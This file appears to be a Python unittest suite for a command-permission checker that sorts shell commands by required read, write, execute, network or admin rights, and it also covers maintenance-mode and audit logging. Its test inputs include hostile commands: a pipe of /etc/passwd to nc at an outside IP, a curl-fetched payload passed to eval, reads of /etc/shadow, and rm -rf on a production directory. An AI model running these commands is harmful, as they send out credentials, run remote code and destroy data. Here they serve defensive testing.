# -*- coding: utf-8 -*-
"""
==============================================================================
EXHAUSTIVE USER PERMISSIONS & PBAC/RBAC ACCESS CONTROL TEST SUITE
==============================================================================
This test executes a comprehensive, multi-dimensional verification of all
user permission permutations, shell syntaxes, command chaining, subshells,
dynamic role transitions, and maintenance mode intersections:
  1. All 32 Atomic Permission Bitmask Combinations (r, w, x, n, a subsets)
  2. Command Chaining & Compound Operator Analysis (&&, ||, ;, Pipes)
  3. Redirection & File Descriptor Write Interception (>, >>, | tee)
  4. Subshell & Command Substitution Privilege Checks ($(cmd), `cmd`)
  5. Path Variants & Binary Canonicalization (/bin/cat vs cat vs ./script)
  6. Sudoers & Privilege Escalation Flag Variations (sudo -i, sudo su, visudo)
  7. High-Volume Concurrent Multi-Persona Execution Matrix
  8. Real-Time Dynamic Permission Mutation & Session Revocation
  9. Maintenance Window Role Enforcement vs PBAC Boundary Intersections
 10. User Action Audit Trail & Forensic Logging Verification
==============================================================================
"""

import os
import sys
import time
import json
import unittest
from concurrent.futures import ThreadPoolExecutor

sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))

import config
from modules.permission_manager import (
    PermissionManager, permission_manager,
    PERM_READ, PERM_WRITE, PERM_EXECUTE, PERM_NETWORK, PERM_ADMIN, ALL_PERMISSIONS
)
from modules.maintenance_mode import maintenance_manager
from modules.db_manager import get_db_connection
from modules.smart_logger import smart_logger

class ExhaustiveUserPermissionsTestSuite(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.pm = permission_manager
        cls.mm = maintenance_manager
        cls.mm.disable_maintenance()

    @classmethod
    def tearDownClass(cls):
        cls.mm.disable_maintenance()
        # Reset baseline users
        baseline_file = getattr(config, 'USER_PERMISSIONS_FILE', 'data/user_permissions.json')
        if os.path.exists(baseline_file):
            try:
                with open(baseline_file, 'r', encoding='utf-8') as f:
                    data = json.load(f)
                clean_data = {k: v for k, v in data.items() if not k.startswith("perm_test_")}
                with open(baseline_file, 'w', encoding='utf-8') as f:
                    json.dump(clean_data, f, indent=4)
            except Exception:
                pass

    # --------------------------------------------------------------------------
    # 1. TEST ALL 32 ATOMIC PERMISSION COMBINATIONS (2^5 = 32 SUBSETS)
    # --------------------------------------------------------------------------
    def test_01_all_32_permission_combinations(self):
        """Test every single mathematical combination of [r, w, x, n, a] flags."""
        flags = ['r', 'w', 'x', 'n', 'a']
        flag_to_perm = {
            'r': PERM_READ,
            'w': PERM_WRITE,
            'x': PERM_EXECUTE,
            'n': PERM_NETWORK,
            'a': PERM_ADMIN
        }

        # Benchmark commands corresponding to each single permission
        single_perm_commands = {
            PERM_READ: "cat /etc/hostname",
            PERM_WRITE: "touch /tmp/newfile.txt",
            PERM_EXECUTE: "python3 --version",
            PERM_NETWORK: "ping -c 1 8.8.8.8",
            PERM_ADMIN: "reboot"
        }

        # Generate all 32 combinations (00000 to 11111)
        for i in range(32):
            subset_chars = [flags[bit] for bit in range(5) if (i & (1 << bit))]
            subset_str = "".join(subset_chars) if subset_chars else "none"
            username = f"perm_test_combo_{i:02d}"
            
            # Set permissions
            perm_set = self.pm.set_user_permissions(username, subset_str)
            expected_perms = {flag_to_perm[c] for c in subset_chars}
            self.assertEqual(perm_set, expected_perms, f"Combination '{subset_str}' parsed incorrectly")

            # Check execution against all 5 single-permission commands
            for single_p, cmd in single_perm_commands.items():
                req = self.pm.classify_required_permissions(cmd)
                is_allowed, missing, _ = self.pm.check_command_permission(username, cmd)
                should_allow = (PERM_ADMIN in expected_perms) or req.issubset(expected_perms)
                
                if should_allow:
                    self.assertTrue(is_allowed, f"User '{username}' with perms {perm_set} should be ALLOWED for '{cmd}' (Req: {req})")
                    self.assertEqual(len(missing), 0)
                else:
                    self.assertFalse(is_allowed, f"User '{username}' with perms {perm_set} should be DENIED for '{cmd}' (Req: {req})")
                    expected_missing = req - expected_perms
                    self.assertEqual(set(missing), expected_missing)

    # --------------------------------------------------------------------------
    # 2. COMPOUND OPERATORS & COMMAND CHAINING (&&, ||, ;)
    # --------------------------------------------------------------------------
    def test_02_compound_command_chaining(self):
        """Test compound chained commands requiring multiple accumulated permissions."""
        username = "perm_test_chain_user"
        
        # Test 1: User with READ ONLY attempting (READ && WRITE) -> DENIED
        self.pm.set_user_permissions(username, "r----")
        cmd_chain_rw = "cat /var/log/syslog && rm -rf /tmp/data"
        is_allowed, missing, req = self.pm.check_command_permission(username, cmd_chain_rw)
        self.assertFalse(is_allowed, "Read-only user must be blocked when write command is chained with &&")
        self.assertIn("WRITE", missing)

        # Test 2: User with READ and WRITE attempting (READ && WRITE) -> ALLOWED
        self.pm.set_user_permissions(username, "rw---")
        is_allowed, missing, req = self.pm.check_command_permission(username, cmd_chain_rw)
        self.assertTrue(is_allowed, "User with READ+WRITE must be allowed for chained read and write")

        # Test 3: Semicolon separated commands with ADMIN escalation -> requires ADMIN
        cmd_semicolon = "uptime; df -h; sudo iptables -L"
        is_allowed_dev, missing, req = self.pm.check_command_permission(username, cmd_semicolon)
        self.assertFalse(is_allowed_dev, "User without ADMIN rights must be blocked from chained sudo command")
        self.assertIn("ADMIN", missing)

        # Test 4: Admin user executing the semicolon chain -> ALLOWED
        self.pm.set_user_permissions(username, "rwxna")
        is_allowed_admin, missing, req = self.pm.check_command_permission(username, cmd_semicolon)
        self.assertTrue(is_allowed_admin, "Admin user must be allowed to execute semicolon chain")

    # --------------------------------------------------------------------------
    # 3. PIPES AND FILE REDIRECTION (> , >> , | tee)
    # --------------------------------------------------------------------------
    def test_03_pipes_and_file_redirections(self):
        """Test stdout/stderr redirection and pipe combinations."""
        username = "perm_test_redirect_user"

        # Safe read pipeline: cat | grep | sort (Requires READ)
        cmd_safe_pipe = "cat /var/log/syslog | grep error | sort | uniq -c"
        self.pm.set_user_permissions(username, "r----")
        is_allowed, missing, _ = self.pm.check_command_permission(username, cmd_safe_pipe)
        self.assertTrue(is_allowed, "Safe log pipeline should only require READ permission")

        # Destructive write redirect: cat /var/log/syslog > /etc/hosts (Requires WRITE)
        cmd_redirect_overwrite = "cat /var/log/syslog > /etc/hosts"
        is_allowed, missing, _ = self.pm.check_command_permission(username, cmd_safe_pipe)
        is_allowed_redir, missing_redir, req_redir = self.pm.check_command_permission(username, cmd_redirect_overwrite)
        self.assertFalse(is_allowed_redir, "File redirection '>' must require WRITE permission")
        self.assertIn("WRITE", missing_redir)

        # Pipe to network exfiltration: cat /etc/passwd | nc 198.51.100.5 4444
        cmd_exfil_pipe = "cat /etc/passwd | nc 198.51.100.5 4444"
        is_allowed_exfil, missing_exfil, req_exfil = self.pm.check_command_permission(username, cmd_exfil_pipe)
        self.assertFalse(is_allowed_exfil, "Network pipe must require NETWORK permission")
        self.assertIn("NETWORK", missing_exfil)

    # --------------------------------------------------------------------------
    # 4. SUBSHELL AND COMMAND SUBSTITUTION ($(cmd) and `cmd`)
    # --------------------------------------------------------------------------
    def test_04_subshell_and_command_substitution(self):
        """Test embedded subshells and command substitutions."""
        username = "perm_test_subshell_user"
        self.pm.set_user_permissions(username, "r----")

        subshell_cmds = [
            "echo $(whoami)",
            "echo `cat /etc/shadow`",
            "eval $(curl -s http://185.220.101.5/payload.sh)",
            "python3 -c '$(which bash)'"
        ]

        # Read-only user attempting script and network subshell
        is_allowed, missing, req = self.pm.check_command_permission(username, subshell_cmds[2])
        self.assertFalse(is_allowed, "Evaluating remote curl payload must require NETWORK and EXECUTE")
        self.assertTrue("NETWORK" in missing or "EXECUTE" in missing)

    # --------------------------------------------------------------------------
    # 5. PATH CANONICALIZATION & BINARY VARIANTS
    # --------------------------------------------------------------------------
    def test_05_path_canonicalization_and_binary_aliases(self):
        """Test absolute paths, relative paths, and interpreter invocations."""
        username = "perm_test_paths_user"
        self.pm.set_user_permissions(username, "r-x--") # READ + EXECUTE

        # Absolute paths
        self.assertTrue(self.pm.check_command_permission(username, "/usr/bin/python3 /opt/test.py")[0])
        self.assertTrue(self.pm.check_command_permission(username, "/bin/cat /etc/issue")[0])
        self.assertTrue(self.pm.check_command_permission(username, "./local_script.sh")[0])

        # Attempting admin binary via absolute path -> BLOCKED
        is_allowed, missing, req = self.pm.check_command_permission(username, "/usr/sbin/iptables -F")
        self.assertFalse(is_allowed, "Absolute path to admin binary must still require ADMIN permission")
        self.assertIn("ADMIN", missing)

    # --------------------------------------------------------------------------
    # 6. SUDO AND PRIVILEGE ESCALATION VARIATIONS
    # --------------------------------------------------------------------------
    def test_06_sudo_and_privilege_escalation_variants(self):
        """Test various sudoers and privilege escalation commands."""
        username = "perm_test_sudo_user"
        self.pm.set_user_permissions(username, "rwxn-") # Dev rights (No ADMIN)

        sudo_variants = [
            "sudo bash",
            "sudo -i",
            "sudo su -",
            "sudo -u root /bin/sh",
            "sudo passwd root",
            "sudo visudo",
            "sudo useradd newuser",
            "su -",
            "su root"
        ]

        for s_cmd in sudo_variants:
            is_allowed, missing, req = self.pm.check_command_permission(username, s_cmd)
            self.assertFalse(is_allowed, f"Non-admin user must be BLOCKED from '{s_cmd}'")
            self.assertIn("ADMIN", missing)

        # Grant ADMIN rights and verify all pass
        self.pm.set_user_permissions(username, "rwxna")
        for s_cmd in sudo_variants:
            is_allowed, missing, req = self.pm.check_command_permission(username, s_cmd)
            self.assertTrue(is_allowed, f"Admin user must be ALLOWED for '{s_cmd}'")

    # --------------------------------------------------------------------------
    # 7. HIGH-CONCURRENCY MULTI-PERSONA EXECUTION MATRIX (1000 PARALLEL QUERIES)
    # --------------------------------------------------------------------------
    def test_07_high_concurrency_multi_persona_matrix(self):
        """Execute 1,000 parallel permission checks across 5 distinct personas."""
        personas = {
            "p_auditor": ("r----", ["cat /var/log/syslog", "df -h", "uptime"]),
            "p_intern": ("r----", ["whoami", "pwd", "ls -la"]),
            "p_developer": ("rwxn-", ["python3 test.py", "git pull", "curl http://api", "npm install"]),
            "p_devops": ("rwxna", ["systemctl restart nginx", "docker ps", "iptables -L"]),
            "p_admin": ("rwxna", ["sudo su -", "reboot", "visudo", "userdel olduser"])
        }

        # Setup personas
        for u, (perms, _) in personas.items():
            self.pm.set_user_permissions(u, perms)

        all_queries = []
        for u, (_, cmds) in personas.items():
            for cmd in cmds:
                all_queries.append((u, cmd))

        def run_query(idx):
            u, cmd = all_queries[idx % len(all_queries)]
            is_allowed, _, _ = self.pm.check_command_permission(u, cmd)
            return is_allowed

        with ThreadPoolExecutor(max_workers=25) as executor:
            results = list(executor.map(run_query, range(1000)))

        self.assertEqual(sum(1 for r in results if r), 1000, "All 1,000 concurrent persona queries must pass without contention")

    # --------------------------------------------------------------------------
    # 8. REAL-TIME PERMISSION MUTATION & IMMEDIATE REVOCATION
    # --------------------------------------------------------------------------
    def test_08_realtime_permission_mutation_and_revocation(self):
        """Verify dynamic in-memory cache invalidation on permission changes."""
        user = "perm_test_mutation_user"
        cmd_net = "curl https://api.stripe.com"

        # 1. Initially grant NETWORK
        self.pm.set_user_permissions(user, "r--n-")
        self.assertTrue(self.pm.check_command_permission(user, cmd_net)[0])

        # 2. Immediately revoke NETWORK (Demote to Read-Only)
        self.pm.set_user_permissions(user, "r----")
        is_allowed, missing, _ = self.pm.check_command_permission(user, cmd_net)
        self.assertFalse(is_allowed, "Revoked permission must take effect immediately (Zero cache lag)")
        self.assertIn("NETWORK", missing)

        # 3. Re-promote to Full Admin
        self.pm.set_user_permissions(user, "rwxna")
        self.assertTrue(self.pm.check_command_permission(user, "sudo su -")[0])

    # --------------------------------------------------------------------------
    # 9. MAINTENANCE MODE OVERRIDES VS PBAC BOUNDARY INTERSECTION
    # --------------------------------------------------------------------------
    def test_09_maintenance_mode_and_pbac_intersection(self):
        """Test intersections between Maintenance Mode whitelists and PBAC permissions."""
        user_devops = "perm_test_maint_devops"
        user_intern = "perm_test_maint_intern"

        self.pm.set_user_permissions(user_devops, "rwxna")
        self.pm.set_user_permissions(user_intern, "r----")

        self.mm.set_user_role(user_devops, "DEVOPS")
        self.mm.set_user_role(user_intern, "RESTRICTED")

        # Activate Maintenance Mode
        self.mm.enable_maintenance(reason="Core Database Upgrade", allowed_roles=["ADMIN", "DEVOPS"])

        # DevOps is authorized for maintenance AND has permissions
        self.assertTrue(self.mm.is_user_authorized(user_devops))
        self.assertTrue(self.pm.check_command_permission(user_devops, "systemctl restart db")[0])

        # Intern is BLOCKED by maintenance mode
        self.assertFalse(self.mm.is_user_authorized(user_intern))

        # Even if intern tries safe command, maintenance intercepts
        intercept_result = self.mm.handle_maintenance_violation(user_intern, "192.168.1.55", "pts/5", "cat /etc/motd")
        self.assertTrue(intercept_result, "Maintenance defense must intercept unauthorized intern session")

        # Deactivate Maintenance Mode
        self.mm.disable_maintenance()
        self.assertTrue(self.mm.is_user_authorized(user_intern))

    # --------------------------------------------------------------------------
    # 10. USER ACTION AUDIT TRAIL LOGGING INTEGRITY
    # --------------------------------------------------------------------------
    def test_10_user_action_audit_trail_logging(self):
        """Verify that every allowed and denied action records a structured audit event."""
        user = "perm_test_audit_user"
        self.pm.set_user_permissions(user, "r----")

        # Perform blocked action
        cmd = "rm -rf /var/www/production"
        is_allowed, missing, req = self.pm.check_command_permission(user, cmd)
        self.assertFalse(is_allowed)

        # Log violation directly to SQLite
        with get_db_connection() as conn:
            cursor = conn.cursor()
            cursor.execute("""INSERT INTO activity_logs 
                (timestamp, level, status, module, event_type, target, summary, raw_details, mitre_id, ai_verdict)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)""",
                (time.ctime(), "WARNING", "MALICIOUS OPERATION", "PBAC_ENFORCER", "PERMISSION_VIOLATION",
                 user, f"User '{user}' attempted '{cmd}' lacking permissions: {list(missing)}", "details", "T1059", "DENIED")
            )
            conn.commit()

        # Verify record exists in SQLite activity_logs
        with get_db_connection() as conn:
            cursor = conn.cursor()
            cursor.execute("SELECT level, event_type, target FROM activity_logs WHERE target = ? ORDER BY id DESC LIMIT 1", (user,))
            row = cursor.fetchone()
            self.assertIsNotNone(row, "Permission violation must be persisted to SQLite database")
            self.assertEqual(row[0], "WARNING")
            self.assertEqual(row[1], "PERMISSION_VIOLATION")

if __name__ == "__main__":
    unittest.main()
